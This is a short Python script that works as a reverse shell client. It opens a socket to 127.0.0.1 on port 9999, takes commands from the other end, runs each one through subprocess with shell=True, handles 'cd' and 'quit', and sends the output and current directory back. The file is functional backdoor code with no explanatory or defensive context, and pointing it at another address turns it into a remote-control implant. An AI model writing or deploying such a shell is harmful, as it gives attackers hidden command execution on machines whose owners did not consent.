import os, socket, subprocess, sys

def shell():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('127.0.0.1', int(9999)))

	while True:
		data = s.recv(2048)
		
		if data.decode("utf-8") == 'quit':
			s.close()
			sys.exit()

		if data[:2].decode("utf-8") == 'cd':
			os.chdir(data[3:].decode("utf-8"))	
		
		if len(data) > 0:
			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_bytes = cmd.stdout.read() + cmd.stderr.read()
			stdout_str = str(stdout_bytes, "cp949")
			s.send(str.encode(stdout_str + str(os.getcwd()) + "> "))
	
	s.close()

def main():
	shell()

if __name__ == "__main__":
	main()